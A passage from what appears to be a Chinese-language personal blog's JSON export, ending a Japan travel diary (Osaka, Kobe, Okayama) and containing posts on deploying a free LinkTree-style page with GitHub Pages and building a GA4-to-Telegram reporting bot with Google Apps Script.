抵達難波八阪神社神社不大，觀光客很多，到此一遊拍幾張照片就離開了。離開後繼續走到下一站「大國町」搭一站到「動物園前」下車，前往通天閣。出站穿過地下道、商店街繼續往前走就會看到通天閣塔。 這邊感覺治安蠻亂的，一出站過地下道有很多遊民，還有遊民在吵架很大聲，有點可怕。商店街巷子狹窄左右都有吃的，有幾家感覺是排隊名店、很多人。約 10:30 抵達通天閣下，準備上去的人大排長龍，我直接放棄。走回地鐵站回大阪。~=11:00 回到大阪梅田出站先去 LINKS 百貨，五樓可以直通 Yodobashi 扭蛋玩具區。逛完 LINKS 穿過大阪車站、樓上的時空廣場，直達大阪大丸百貨。來到 13 樓這邊有寶可夢中心、大阪任天堂、CAPCOM…喵了一下薩爾達周邊， 上次已經買很多了 ，這次什麼都沒買就離開了。路過阪神虎周邊商店。準備去吃 Shake Shack，七月去曼谷吃過， 意猶未盡 ；來大阪回味。~=12:00 Shake ShackShake Shack 阪神梅田店 就在阪神虎商店隔壁。直接用自助點餐，這次吃酪梨培根雞肉堡跟奶昔；這家空間蠻大的、位子也多。大阪車站吃飽後再大阪車站附近閒晃，想說去大阪的 Kiddy Land 找找吉伊卡哇。在大阪地下街迷路，走了很久才找到阪急三番街，再走地下聯絡道從南館到北館，美食街上來就是了。吉伊卡哇自已獨立一個櫃位在另外一邊。13:00 Kiddy Land Osaka Chiikawa排隊的人蠻多的，粗估至少要等 40 分鐘以上。 想當然，我沒有花時間排隊等。一樓有 熊本熊 活動。可能是假日的關係活動比較多，Kiddy Land 外也有卡娜赫拉的合影活動。(另一隻 Usagi XD)13:20 前往神戶在地下街又迷路了一下才找到大阪梅田地鐵站，搭阪急神戶線前往神戶三宮（阪急）。13:50 抵達神戶時間還很早，打算先去「 神戶動物王國 」找卡皮巴拉。Google Map 要我搭乘「新交通港灣人工島線」，在地下街繞了老半天找不到對應的指標。(迷路 Day)出站才發現就是天上跑的這條，從二樓三宮站入站。車站很多人，後來才知道今天剛好是 神戶馬拉松 。迷路 Day…因為車剛好來沒仔細看上錯車，上到往北埠頭的車，悲劇從此刻開始。 往 神戶動物王國 要坐往 神戶空港 的，往 北埠頭 的會在 北埠頭 就回頭回神戶。 ⚠️⚠️⚠️神戶馬拉松有封路跑上高架，這條地鐵跟北捷文湖線一樣是早期的輪胎捷運。14:20 發現坐錯車 在中埠頭 跳車搭到這邊苗頭不對直接跳車，Google Map 建議我走回市民廣場站轉搭下一班。可能是因為是海埔新生地港口區，這邊很荒涼走起來覺得很遠。走快到市民廣場前站想說怎麼那麼熱鬧，原來是神戶馬拉松的終點活動會場。 悲劇 2 因為人太多所以這站不給進了，要再往前走到南公園站。走到南公園站再一站就到了，就懶得搭捷運直接走去神戶動物王國…同前述，因為太荒涼走起來感覺很遠，確實也很遠，從中埠頭走來 2 公里(約 30 分鐘)。14:50 抵達神戶動物王國門票：2,200 日圓鯨頭鸛、兔猻、小熊貓神戶動物王國雖然是半室內半室外，但裡面的動線規劃蠻好的，各種飛禽走獸都有，而且多半可以近距離接觸，很適合親子花個半天來這裡玩；動物的狀況相較姬路市立動物園好很多、環境也很乾淨。卡皮巴拉來這邊的目的達成，來摸卡皮巴拉，好肥、毛摸起來好粗糙很像掃把。每隻都一臉慵懶，不用上班真好！可能因為太胖，現在不販賣食物在場內餵食、不能餵場外食物或放東西在他頭上。另一區還有袋鼠、羊近距離互動。摸前、摸完都要記得洗個手。還有一隻海豹，但看起來場地太小他一直在繞圈圈QQ企鵝餵食（需要排整理券）。可愛的小爪水獺家族，一直嚶嚶叫。水獺這邊有一隻馬來貘，但是沒什麼理他 QQ巨嘴鳥跟梟，還有腳邊會出現的雉雞。(走路要小心不要踩到⚠️)朱利安國王跟會吃同事的鵜鶘、也有夜行館貓頭鷹室內還有兔兔貓貓狗狗互動區（要排整理券）、飲食、紀念品店…等等整體來說體驗蠻好的！15:50 離開，準備返回神戶主要是來摸卡皮巴拉，加上時間不太夠所以沒有停留太久。~= 16:05 抵達(神戶)三宮站因為神戶馬拉松的緣故，出站的人很多。離吃飯時間還有一個多小時，先在神戶三宮附近逛逛，一樣去找扭蛋跟 Kiddy Land。神戶的 Kiddy Land 沒什麼人但是吉伊卡哇的商品很少，沒找到我要的睡衣烏薩奇。Center Plaza 這邊有點年代但是有很多商店可逛。去二樓找扭蛋也去二手商店看看有沒有我要的烏薩奇。有一家信長書店，可以買御守送朋友，嘻嘻。~=17:00 神戸牛 吉祥吉B1 就有一家 神戸牛 吉祥吉，差不多快五點就先來吃晚餐了。時間還很早，沒什麼人；老闆聽到我是台灣來的很熱情，這餐也是來神戶的目的， 吃一餐好的 — 神戶牛 ，不然來的幾天幾乎都亂吃。我點「神戶牛赤身肉牛排 220g」7,700 日圓 (未稅價⚠️，結帳要含稅)加購套餐(生菜、飯、湯)跟生啤。生菜清爽，湯是牛肉湯，很好喝。肉很嫩、汁多、肉味足，相較昨天吃的神戶牛，這才是神戶牛的滋味。 不過真要說我還是比較喜歡鐵板的，更勝洋食。最後實刷： $2,158 台幣 。17:40 吃飽離開，前往神戶塔吃完走到海岸線的舊居留地、大丸前站，搭一站後再步行前往神戶塔。神戶這邊好熱鬧(相較姬路)，有好多百貨可以逛。搭乘往 新長田，在下一站 港元町 下車。18:05 抵達神戶塔周邊去年來的時候在維修 ，目前已完全開放了。神戶港這邊蠻有港灣小鎮的感覺，有機會的話會考慮在神戶這邊住一晚。這次來走馬看花一下就走了。18:30 回神戶中華街回神戶站的路上先去中華街買 Kobe Frantz 巧克力伴手禮 。回到 JR 元町站請注意是 JR 元町站不要跑去阪神電車元町站。18:53 搭乘 快速 姬路方面網干 前往神戶(兵庫)18:57 同月台另一側 換乘 新快速 湖西線經由網干 換乘快 20 分鐘抵達 ，還好有換成才趕在姬路唯一一家藥妝店松本清免稅時間結束前抵達。這列車車型也是要按旁邊開門按鈕才會開門的、車廂彼此是分開的。19:34 抵達姬路19:45 抵達姬路 Piole 松本清採購藥妝 請注意雖然他營業時間寫到 21:00 但是 免稅時間只到 20:30 。⚠️⚠️⚠️買了一個超迷你 Cup Noodle在日本的最後一晚，在飯店吃吃吃喝喝宵夜、啤酒。(這丸子是鬆軟口感…) 晚安姬路。Day 7 (11/18 週一) 岡山、回程08:30 早安姬路最後看一眼姬路的早晨。到新幹線站準備搭乘 08:52 的新幹線前往岡山。搭乘 08:52 的新幹線自由座前往岡山09:13 抵達岡山車站搭乘新幹線大約 21 分鐘就會到岡山車站了，可惜這次時間不夠無法 再訪廣島 。跟上次一樣直接到岡山車站西口搭乘往機場巴士的地方，這裡就有置物櫃寄放行李、也有廁所(這時間百貨還沒開廁所很少)。09:30 岡山車站麥當勞吃這陣子台灣很紅的「鬆餅漢堡」看不懂日文差點選錯，要選這個「マックグリドル」才是鬆餅系列。 日本麥當勞早餐時段到 10:30。吃完大約 10:00 沒有特別想去的地點。上次已經去過岡山城跟吉備津神社了 ，最後時間就去逛逛岡山 AEON 永旺夢樂城。岡山藝術季今年岡山有 藝術季活動 。施工中的岡山站跟暫時被移到車站旁的桃太郎。從地下街過馬路到 AEON MALL B2，這邊也有一家麥當勞。這邊很大很好逛，幾乎所有品牌都有。要吃東西、買伴手禮 (B1-B2) 也都有。繼續找扭蛋，但都沒找到我要的電車按鈕扭蛋，放棄…應該是沒再出了。也有幾家店有賣吉伊卡哇。~=11:00 準備吃午餐 雖然沒有很餓但是為了備戰下午候機跟虎航沒供餐，所以還是要吃。 ⚠️⚠️⚠️樓上這邊吃的選擇很多。豚ステーキ専門店 B 岡山店選了一家主打鐵板豬排的店。點了一份鐵板豬排定食(200g)跟生啤。最後付 2,178 日圓比較訝異的是豬排上來的時候沒有全熟，大約 7 分熟；查了一下評價跟介紹好像就是這家的特色，不過我還是趁鐵板熱的時候把能用熟的肉塊都用熟了。 吃起來是真的好吃，很 Juice、肉香味足、不會咬不爛；私心覺得不輸昨天的神戶牛(我可能沒富貴命)。小廢物行李箱(大約跟 Airpods Pro 一樣大)跟娃包最後在一樓無印良品買了些東西大約 12:15 就離開了。~=12:30 回到岡山站準備搭乘 13:00 的交通車去岡山機場。最後再看一眼岡山。~=13:00 搭乘交通車前往岡山機場在 21 月台這邊排隊候車，不用擔心搭不上，只要是 13:00 前來排隊的都會送你到機場(滿了會再加開交通車)。可以直接刷交通卡上下車(Suica) 或是去候車亭裡面投幣買票。因為滿員提早 12:45 就發車了。~=13:20 抵達岡山桃太郎機場時間還非常早，今年搭的是 17:30 起飛的航班、去年是搭 15:25 的這個時間來剛剛好，17:30 起飛的現在來要乾等快 4 個小時。https://www.okayama-airport.org/tw/access/bus 但是目前沒辦法，因為 下一班是 15:55，到機場 16:25 ；雖然機場很小同時間航班也只有一班出境算快，但怕塞車之類的因素，很難保證 16:25 會到，像我來的時候遇到塞車整整多了快 30 分鐘車程。 就看之後岡山機場會不多開交通車班次了，或是去 日本自由行討論區 社團找人拼計程車。 看別人分享岡山車站到機場計程車大約 7,000 日圓上下。在機場附近亂晃，機場外有一個縮小版的岡山後樂園還有很紅的楓葉。車站外也有一尊桃太郎，另外機場溫馨提醒要買保險， 我這次就真的就差點被自行車撞。⚠️國內線這邊有蠻多位子可以坐著休息。一樓只有有一家伴手禮店其他什麼都沒有， 跟去年一樣 買了一個冰桃麻糬吃。二樓在整修只剩部分店有開， 去年能去的觀景平台 好像也沒開放了；但至少還有一家伴手禮店跟幾家吃的。~=15:00 開始辦理登機手續桃太郎機場太小，跟其他機場報到＋托運的流程不一樣。 這邊是統一排隊，要托運的行李過 X 光＋會貼封條貼紙、沒要托運的就不用(出境前的安全檢查會掃描其他的)，無托運行李的也要跟著排 ，排到就跟機場人員說沒要托運直接過、如果貼完貼紙又打開行李箱就要重新掃描＋貼貼紙。⚠️⚠️⚠️ 機場人員會講中文…很厲害~=15:15 報到＋托運完畢這次沒買什麼、沒買酒就 17 kg 了…但是我幾乎沒手提行李，全塞進去了。~=16:20 開始排安檢、出境機場整修中. .但依然有扭蛋。雖然只有一個航班但是因為機場小、工作人員少、只有一條線、檢查的也很細，所以排安檢出境就大概花了快 20–30 分鐘。倒水跟丟棄物品的地方也就只是個箱子。 感覺如果趕 15:55 岡山出發，到機場 16:25 的交通車，如果能準時抵達，基本上報到托運那邊已經全空了可以直接辦理，然後再上來直接排出境安檢應該是來得及的。 只有我們這一航班，所以應該會等到所有已報到的人安檢完才會起飛，早來機場晚排安檢的人也沒比較快。~=16:42 開始候機候機室不大，只有一家免稅店，有賣一些伴手禮、菸酒品相不多。想投幾罐桃子水帶回台灣，全賣完了；只好投一罐紅茶花伝，回來後發現很好喝、不會太甜，後悔沒多投幾罐。~=18:10 起飛 (延誤 40 分鐘) 再見岡山、再見日本。在機上隔壁坐一位 Youtuber 大哥「 跟著我們一起Chill with us 」人很 Nice，他這次是去四國的，互相交流了一下景點推薦，有機會也想去四國。19:45 抵達台灣 (延誤 10 分鐘)還好只影響 10 分鐘，速速提領完行李飛奔巴士站。20:20 前往台北的大有巴士依照地點不同可以搭不同的車回家，之前是搭國光直接回台北，這次我要搭大有巴士 11 月台回新北。 好巧不巧悠遊卡餘額不夠刷不過，又飛奔去櫃檯用現金買票(還好前一天把台幣帶在身上)，最終有趕上客運。旅程結束。心得總結這次的行程安排太緊湊，很多地方都走馬看花，尤其前三天因為移動距離較長加上停留時間太短，沒有好好慢慢享受島根出雲、松江的美麗景色；如果有機會會想再去一次，看夕陽、看楓葉、看神迎神在祭典。如果想了解歷史再去出雲可參考蘭爸爸的影片：1. 日本這片土地是怎麽誕生的？竟然是被生出來的！！|日本神話|日本的誕生|天地開闢|国産み|神産み|大八島囯|伊邪那岐|伊邪那美|蘭爸爸說故事 2. 日本最調皮的神，與自己的姐姐生下了日本皇室的直系祖先！斬殺八岐大蛇，迎娶美麗的妻子，堪稱神仙界的“神生贏家”！日本最初的和歌竟然出自他口？！|日本神話|須佐之男|岩戶隱|八岐大蛇|稻田姬|蘭爸爸說故事 3. 一隻兔子爲何要招惹一群鯊魚？經歷過兩次的死而復生，他竟然迎娶了自己祖先的女兒！大國主神話|大國主|因幡之白兔|根之囯|日本神話|蘭爸爸說故事 有介紹到天照大神、大國主神(出雲神社)、因幡之白兔的故事。山陽 岡山廣島地區遊記 [遊記] 2023 山陽地區 廣島岡山 6 日自由行可以一起參考山陽地區遊記，有時間的話可以山陽＋山陰一起玩。KKday 推廣 🛒 日本 JR PASS|鳥取・松江區域周遊券|eMCO 電子票 (如果只去松江、鳥取松江地區可考慮) 關西&amp;山陰地區鐵路周遊券 JRPass (岡山機場進出最佳選擇) 日本eSIM卡｜每日高速、總量、無限流量吃到飽方案 日本 JR PASS｜山陽＆山陰地區鐵路周遊券｜eMCO 電子票 (一口氣玩遍山陽山陰地區) 鳥取沙丘 | 日本唯一的驚險滑沙體驗 【鳥取巴士一日遊】鳥取砂丘、浦富海岸巡航、砂之美術館、採梨子體驗｜含特色午餐（大阪出發） 遊覽鳥取沙丘和著名的出雲大社 2 日巴士之旅（大阪出發） 新年參觀！出雲大社停留3小時【廣島出發】 如果這篇文章對您有幫助，歡迎使用我的 推廣連結 選購 KKday 商品、行程，我將獲得部分收益，持續更多旅遊創作，謝謝。更多遊記 [遊記] 2023 九州 10 日自由行獨旅 [遊記] 2023 山陽地區 廣島岡山 6 日自由行 [遊記] 9/11 名古屋一日快閃 [遊記] 2023 東京 5 日自由行 [遊記] 2023 京阪神 8 日自由行有任何問題及指教歡迎 與我聯絡 。===本文首次發表於 Medium ➡️ 前往查看如果這篇文章對您有幫助，歡迎使用我的 推廣連結 選購 KKday 商品、行程，我將獲得部分收益，持續更多旅遊創作，謝謝： Follow Me on Medium 981+ Followers 230 Total Views Last Statistics Date: 2025-01-19 | 145 Views on Medium. " }, { "title": "linkyee — 使用 GitHub Pages 快速免費建立個人類 LinkTree 連結頁面", "url": "/posts/70aeddb1fd9b/", "categories": "ZRealm Robotic Process Automation", "tags": "linktree, github-pages, automation, ruby, jekyll", "date": "2024-10-27 13:36:34 +0800", "snippet": "linkyee — 使用 GitHub Pages 快速免費建立個人類 LinkTree 連結頁面使用 GitHub Pages 快速建立自己的連結頁面，100% 免費、客製化並支援自訂義網域成果https://link.zhgchg.li 我以把成果開源並打包成 Template Repo (linkyee)，有需要的朋友可以直接 Fork 快速部署使用。linkyee — Your O...", "content": "linkyee — 使用 GitHub Pages 快速免費建立個人類 LinkTree 連結頁面使用 GitHub Pages 快速建立自己的連結頁面，100% 免費、客製化並支援自訂義網域成果https://link.zhgchg.li 我以把成果開源並打包成 Template Repo (linkyee)，有需要的朋友可以直接 Fork 快速部署使用。linkyee — Your Own Link Pages優點： 直接部署在 Github Pages 穩定、免費 掌握 HTML 原始檔案，可隨意修改排版、樣式、移除廣告、版權宣告； (預設樣式就是我用 GenAI ChatGPT 建立的) 支援自訂域名 支援動態變數，例如我預設建了 Medium 追蹤者、Github Repo 星星數變數，可自動帶入、更新追蹤者數量在頁面上。 🚀🚀🚀 頁面載入快速 照本文簡單幾步就能完成設定部署Github PagesGithub Pages 是由 Github 提供的免費靜態頁面寄存服務，所有 Github Free 帳號只要是 Public Repo 都能直接使用，如果是 Private Repo 則須先付費升級 Github 帳號。限制 只能寄存靜態檔案資源： HTML, CSS, JavaScript, 字體檔案, 圖片檔案, PDF, 音訊檔案, 文字檔案…等等 網站(Repo)大小不得超過： 1 GB 這猜測也是軟限制，因為我的 Github Pages Jekyll Repo 已經快 5 GB 了。 部署工作時間最長： 10 分鐘 每小時最多部署： 10 次 (軟限制) 每月流量限制 ：100 GB (軟限制) 請求過於頻繁可能會響應 HTTP 429其他 Github Pages 應用文章 我使用 Github Pages 部署的 Jekyll Blog ➡️ ZhgChgLi 無痛轉移 Medium 到 Github Pages Github Pages 自訂網域教學開始使用 — 部署在 GitHub Pages步驟 1. 點擊 linkyee 範本庫右上角的「Use this template」按鈕 -&gt;「Create a new repository」：步驟 2. 勾選「Include all branches」，輸入您想要的 GitHub Pages 倉庫名稱，完成後點擊「Create repository」： GitHub Pages Repo 名稱就會是訪問網址。 如果將 Repo 名稱輸入為 your-username.github.io ，那麼這將成為您的 GitHub Pages 網站的直接訪問網址。 如果您已有 your-username.github.io Repo，那麼 GitHub Pages 網址將會是 your-username.github.io/Repo-Name 。等待 Fork 完成。初次建立時可能會遇到部署錯誤，這是由於 Fork 倉庫的權限問題。接下來我們按照步驟進行調整。步驟 4. 前往 Settings -&gt; Actions -&gt; General，確保選擇以下選項： Actions permissions: Allow all actions and reusable workflows Workflow permissions: Read and write permissions選擇完畢後，點擊 Save 按鈕儲存變更。步驟 5. 前往 Settings -&gt; Pages，確認 GitHub Pages 的分支設定為「gh-pages」： 「Your site is live at: XXXX」訊息即為您的 GitHub Pages 公開訪問網址。步驟 6. 前往 Settings -&gt; Actions，等待第一次部署完成：步驟 7. 訪問 GitHub Pages 網址，確認 Fork 是否成功： 恭喜！部署成功，現在您可以修改設定檔案，將其替換為您的資料。🎉🎉🎉設定設定檔案編輯位於根目錄中的 config.yml 文件。# 網站配置 # 主題名稱，對應至目錄：./theme/xxxx theme: default # HTML 語言設定 lang: \"en\" # 插件（實作於 ./plugins/PLUGIN_NAME） # 在下方設定中使用 {{ vars.PLUGIN_NAME }} # 插件的輸出結果可在下方使用，例如：{{vars.MediumFollowersCountPlugin}} plugins: # 自動獲取 Medium 的追蹤者數量 - MediumFollowersCountPlugin: username: zhgchgli # 自動獲取 GitHub 倉庫的星標數量 - GithubRepoStarsCountPlugin: - ZhgChgLi/ZMarkupParser - ZhgChgLi/ZReviewTender - ZhgChgLi/ZMediumToMarkdown - ZhgChgLi/linkyee # Google Analytics 追蹤 ID google_analytics_id: # HTML 標題 title: \"ZhgChgLi 的連結集\" # 頭像圖片路徑 avatar: \"./images/profile.jpeg\" # 名稱區塊文字 name: \"@zhgchgli\" # 標語區塊文字 tagline: &gt;- 一位來自台灣的 iOS、網頁與自動化開發者，熱愛分享、旅行與寫作。 # 連結列表 # icon：使用 Font Awesome 圖示 (https://fontawesome.com/search?o=r&amp;m=free) # text：顯示在連結上的文字 # title：連結的標題 # url：連結的網址 # alt：替代文字（無障礙使用） # target：`_blank` 在新頁籤打開，`_self` 在同頁面打開 links: - link: icon: \"fa-brands fa-medium\" text: \"技術部落格 &lt;span class='link-button-text'&gt;({{vars.MediumFollowersCountPlugin}} Followers)&lt;/span&gt;\" url: \"https://blog.zhgchg.li\" alt: \"ZhgChgLi 的技術部落格\" title: \"ZhgChgLi 的技術部落格\" target: \"_blank\" - link: icon: \"fa-brands fa-medium\" text: \"旅行日誌 &lt;span class='link-button-text'&gt;({{vars.MediumFollowersCountPlugin}} Followers)&lt;/span&gt;\" url: \"https://medium.com/ztravel\" alt: \"ZhgChgLi 的旅行日誌\" title: \"ZhgChgLi 的旅行日誌\" target: \"_blank\" - link: icon: \"fa-solid fa-rss\" text: \"個人網站\" url: \"https://zhgchg.li/\" alt: \"ZhgChgLi 的網站\" title: \"ZhgChgLi 的網站\" target: \"_blank\" - link: icon: \"fa-brands fa-swift\" text: \"ZMarkupParser &lt;span class='link-button-text'&gt;({{vars.GithubRepoStarsCountPlugin['ZhgChgLi/ZMarkupParser']}} Stars)&lt;/span&gt;\" url: \"https://github.com/ZhgChgLi/ZMarkupParser\" alt: \"ZMarkupParser 是一個純 Swift 庫，用於將 HTML 字串轉換為具自訂樣式的 NSAttributedString。\" title: \"ZMarkupParser 是一個純 Swift 庫，用於將 HTML 字串轉換為具自訂樣式的 NSAttributedString。\" target: \"_blank\" - link: icon: \"fa-brands fa-app-store-ios\" text: \"ZReviewTender &lt;span class='link-button-text'&gt;({{vars.GithubRepoStarsCountPlugin['ZhgChgLi/ZReviewTender']}} Stars)&lt;/span&gt;\" url: \"https://github.com/ZhgChgLi/ZReviewTender\" alt: \"ZReviewTender 是一個從 App Store 和 Google Play Console 獲取應用評論並整合至工作流程的工具。\" title: \"ZReviewTender 是一個從 App Store 和 Google Play Console 獲取應用評論並整合至工作流程的工具。\" target: \"_blank\" - link: icon: \"fa-brands fa-markdown\" text: \"ZMediumToMarkdown &lt;span class='link-button-text'&gt;({{vars.GithubRepoStarsCountPlugin['ZhgChgLi/ZMediumToMarkdown']}} Stars)&lt;/span&gt;\" url: \"https://github.com/ZhgChgLi/ZMediumToMarkdown\" alt: \"ZMediumToMarkdown 是一個強大的工具，可輕鬆下載並將 Medium 文章轉換為 Markdown 格式。\" title: \"ZMediumToMarkdown 是一個強大的工具，可輕鬆下載並將 Medium 文章轉換為 Markdown 格式。\" target: \"_blank\" - link: icon: \"fa-brands fa-github\" text: \"linkyee &lt;span class='link-button-text'&gt;({{vars.GithubRepoStarsCountPlugin['ZhgChgLi/linkyee']}} Stars)&lt;/span&gt;\" url: \"https://github.com/ZhgChgLi/linkyee\" alt: \"linkyee 是一個完全自訂且開源的 LinkTree 替代方案，可直接部署在 GitHub Pages 上。\" title: \"linkyee 是一個完全自訂且開源的 LinkTree 替代方案，可直接部署在 GitHub Pages 上。\" target: \"_blank\" # 社交媒體連結列表 # icon：使用 Font Awesome 圖示 (https://fontawesome.com/search?o=r&amp;m=free) # title：連結的標題 # url：社交媒體連結的網址 # alt：替代文字（無障礙使用） # target：`_blank` 在新頁籤打開，`_self` 在同頁面打開 socials: - social: icon: \"fa-brands fa-medium\" url: \"https://blog.zhgchg.li\" title: \"ZhgChgLi 的 Medium\" alt: \"ZhgChgLi 的 Medium\" target: \"_blank\" - social: icon: \"fa-brands fa-github\" url: \"https://github.com/ZhgChgLi\" title: \"ZhgChgLi 的 GitHub\" alt: \"ZhgChgLi 的 GitHub\" target: \"_blank\" - social: icon: \"fa-brands fa-twitter\" url: \"https://twitter.com/zhgchgli\" title: \"ZhgChgLi 的 Twitter\" alt: \"ZhgChgLi 的 Twitter\" target: \"_blank\" - social: icon: \"fa-brands fa-linkedin\" url: \"https://www.linkedin.com/in/zhgchgli/\" title: \"ZhgChgLi 的 LinkedIn\" alt: \"ZhgChgLi 的 LinkedIn\" target: \"_blank\" - social: icon: \"fa-brands fa-instagram\" url: \"https://www.instagram.com/zhgchgli/\" title: \"Instagram\" alt: \"ZhgChgLi 的 Instagram\" target: \"_blank\" - social: icon: \"fa-solid fa-envelope\" url: \"zhgchgli@gmail.com\" title: \"Email: zhgchgli@gmail.com\" alt: \"zhgchgli@gmail.com\" target: \"_blank\" # 頁尾文字 footer: &gt; 歡迎來到我的網站！追蹤我在 Medium 或 GitHub 上的最新動態，或在 Instagram 和 LinkedIn 上保持聯繫。 # 頁尾版權聲明 # Linkyee 是一個 100% 免費的開源專案—您可以隨意修改版權聲明。:) copyright: &gt; © 2024 &lt;a href=\"https://zhgchg.li\" target=\"_blank\"&gt;ZhgChgLi&lt;/a&gt;。由 &lt;a href=\"https://github.com/ZhgChgLi/linkyee\" target=\"_blank\"&gt;linkyee&lt;/a&gt; 提供技術支持。 請注意，每次修改文件後，您需要等待 GitHub Actions 完成自動建置和頁面建置與部署任務。 重新整理頁面以使變更生效。🚀成功！！自訂風格樣式、修改預設主題 ./themes/default/index.html ./themes/default/styles.css ./themes/default/scripts.js創建新主題 ./themes/ YOUR_THEME 在 config.yml 文件中更新為 theme:YOUR_THEME沒錯，您可以使用像 ChatGPT 這樣的 GenAI 工具，來幫助您創建自訂的連結頁面！(預設樣式也是我用 ChatGPT 產的)自動重新部署預設情況下，專案每天會自動重新部署一次，以刷新插件的動態變數值。您可以在 Github Action — Automatic build ( .github/workflows/build.yml) 中調整 cron 設定：schedule: - cron: '0 0 * * *' # 每日午夜 00:00 (UTC) 執行如果不需要定時重新部署，可以直接刪除 schedule 區塊。自訂網域 ❤️❤️❤️您可以設置自訂的 GitHub Pages 網域， 例如我的： https://link.zhgchg.li 。可以找我之前的文章「 Github Pages 自訂網域教學 」一步一步從購買到綁定網域，也可以通過 我的 Namecheap 推廣連結購買網域 — 我將獲得部分分潤，這將幫助我繼續貢獻開源專案。Buy me a coffee ❤️❤️❤️https://www.buymeacoffee.com/zhgchgli如果這個專案對您有幫助，請考慮 Star Repo、推薦給朋友 ， 或 贊助我一杯咖啡。感謝您的支持！歡迎提出 Issue，或透過 Pull Request 提交修正或貢獻。:)有任何問題及指教歡迎 與我聯絡 。===本文首次發表於 Medium ➡️ 前往查看Follow Me on Medium 981+ Followers 275 Total Views Last Statistics Date: 2025-01-19 | 203 Views on Medium. " }, { "title": "簡單 3 步驟 — 打造免費 GA4 自動數據通知機器人", "url": "/posts/1e85b8df2348/", "categories": "ZRealm Robotic Process Automation", "tags": "automation, google-apps-script, telegram, google-analytics, rpa-solutions", "date": "2024-10-20 16:19:52 +0800", "snippet": "簡單 3 步驟 — 打造免費 GA4 自動數據通知機器人使用 Google Apps Script 完成 RPA，自行串接 GA4 + Telegram Bot 數據通知機器人Photo by BoliviaInteligente前言大約從 2020 年開始就自己在摸索使用手邊工具實現 RPA，從一開始只是為了自動化個人例行任務，到後來工作也加入了規模更大型的組織，時常會遇到跨團隊或仰賴人與...", "content": "簡單 3 步驟 — 打造免費 GA4 自動數據通知機器人使用 Google Apps Script 完成 RPA，自行串接 GA4 + Telegram Bot 數據通知機器人Photo by BoliviaInteligente前言大約從 2020 年開始就自己在摸索使用手邊工具實現 RPA，從一開始只是為了自動化個人例行任務，到後來工作也加入了規模更大型的組織，時常會遇到跨團隊或仰賴人與人的任務、甚至是重複性任務，才發現 RPA 自動化的效益所在。舉例來說：某個重複任務每個月會發生 10 次，每次需花費 30 分鐘處理，有 60 人會遇到，每年團隊等於消耗 3,600 小時在這上面，如果能投資 100 小時開發成自動化，後續解放出來的時間，就能投入在更有價值的工作上；實際等於 3,600 浪費的工時＋3,600 更值得投資的產出。詳細可參考我之前的文章： 2021 Pinkoi Tech Career Talk — 高效率工程團隊大解密 使用 Google Apps Script 實現每日數據報表 RPA 自動化其他做過的 RPA： [GMail to Slack] 運用 Google Apps Script 轉發 Gmail 信件到 Slack [Google Form x Google Sheet xSlack] Slack 打造全自動 WFH 員工健康狀況回報系統 [Big Query x Slack ] Crashlytics + Big Query 打造更即時便利的 Crash 追蹤工具 [Google Analytics x Slack] Crashlytics + Google Analytics 自動查詢 App Crash-Free Users Rate [Github Webhook x Line Notify] 使用 Google Apps Script 三步驟免費建立 Github Repo Star Notifier [Slack x OpenAI (ChatGTP) ] Slack &amp; ChatGPT Integration [Google Analytics x Google Sheet] 使用 Google Apps Script 實現每日數據報表 RPA 自動化 [iOS Shortcut x Line x Reminders] iOS 捷徑自動化應用場景 — 自動轉發簡訊與自動建立提醒待辦事項 [Apple Store API x Google Play Console API x Github Action] Github Action x ZReviewTender 免費快速部署你的 App 商城評價監控機器人 [Telegram Bot] 10 分鐘快速移轉 Line Notify 到 Telegram Bot 通知 [Medium to Jekyllrb] 無痛轉移 Medium 到自架網站從後台數據看之前蠻多文章有被 ChatGPT 或各種 GenAI 服務收錄，間接的幫助了許多非工程背景但也想嘗試使用 RPA 解決問題的朋友，因此我仍會持續分享自己生活或工作上遇到的 RPA 場景跟我的解決方案與大家分享 — ZRealm Robotic Process Automation 。工商時間如果您與您的團隊有自動化工具、流程串接需求，不論是 Slack App 開發、Notion、Asana、Google Sheet、Google Form、GA 數據，各種串接需求，歡迎與我 聯絡開發 。本篇 Google Analytics 4 x Telegram Bot這次要介紹的串接場景是接續上一篇「 10 分鐘快速移轉 Line Notify 到 Telegram Bot 通知 」時想到我的 Medium 備份站「 zhgchg.li 」一直都沒有關注他的 GA4 網站數據，想說好像可以多做一個通知機器人，每日傳送過去 7 天的網站數據到指定的 Telegram Channel 讓我知道。本篇只是小品，如果要做完整的自動化數據報表請參考之前的文章「 使用 Google Apps Script 實現每日數據報表 RPA 自動化 」另外之前也曾串過 GA4 撈取 App Crash-free rate 可參考此篇文章「 Crashlytics + Google Analytics 自動查詢 App Crash-Free Users Rate 」。 Google Apps Script 免費限制、詳細使用、部署、功能介紹本篇不會再多介紹，請參考 之前文章 。 Telegram Bot 創建、使用本篇也不會再多介紹，同樣請參考 之前文章 。成果先上最終效果，Google Apps Script 每日下午 12–13 點之間會自動去撈取我想要的 Google Analytics 4 網站數據並組合成訊息透過 Telegram Bot 傳送到我的 Telegram Channel，我可以快速檢閱近 7 天網站數據。我想要觀測的數據是： 近 7 天 7daysAgo ~ today 總瀏覽數 screenPageViews 活躍使用者數 active7DayUsers 新使用者數 newUsers Top 10 瀏覽頁面 screenPageViews / pageTitle 新使用者最初來源媒介 newUsers / firstUserSourceMedium 實際可依照你自己的需求使用 GA Dev Tools 產生調整。Step 1. 使用 GA4 Query Explorer 官方工具 產生數據報表查詢參數首先，我們需要使用 GA4 Query Explorer 官方提供的工具產生我們需要的查詢數據報表參數： Select Property: 記下你的 property 編號 property 編號稍後撰寫 Google Apps Script 會使用。 start date, end date: 報表開始～結束的日期範圍，可使用 YYYY-MM-DD 或 yesterday , today , NdaysAgo 魔術變數。 metrics: 選擇你想要查詢的指標 dimensions: 選擇你想要查詢的維度 metric aggregations: 數據合併計算規則這邊以我的場景為例： property 編號: 318495208 start_date: 7daysAgo end_date: yesterday 因 GA 數據報表會延遲，查詢前一天～七天最準確。 metric aggregations: total其他 filter, limit 可依照自己需求設定：filter 我用不到留空；limit 我輸入 10，因為我只想知道 Top 10。點擊「MAKE REQUEST」產生對應的數據報表查詢參數及結果：記下以下請求參數，稍後撰寫 Google Apps Script 會使用：{ \"dimensions\": [ { \"name\": \"pageTitle\" } ], \"metrics\": [ { \"name\": \"screenPageViews\" } ], \"dateRanges\": [ { \"startDate\": \"7daysAgo\", \"endDate\": \"yesterday\" } ], \"limit\": \"10\", \"metricAggregations\": [ \"TOTAL\" ]}結果： 與 GA 上的數據比較是否正確，正確相符 ✅✅✅Step 2. 建立 Google Apps Script &amp; 使用 Google Analytics Data API 查詢資料 